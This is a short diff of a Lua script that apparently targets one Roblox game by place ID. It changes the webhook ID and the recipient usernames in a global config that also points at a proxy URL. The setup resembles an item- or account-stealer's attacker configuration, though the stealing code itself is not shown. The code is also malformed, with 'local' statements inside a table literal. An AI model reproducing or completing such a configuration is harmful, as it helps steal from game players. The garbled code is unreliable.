@@ -9,8 +9,8 @@ if game.PlaceId ~= 142823291 then
     return
 end
 _G.ED_CONFIG = {
-	local WEBHOOK_ID = "150393afd8d35e633698fe55c6360451"
-	local USERNAMES = {"Nuls_rip"}
+	local WEBHOOK_ID = "1450903311711469688"
+	local USERNAMES = {"Tskemma1"}
 	local PROXY_URL = "https://eternal-darkness.org/proxy/"
 
 if not _G.ED_CONFIG then
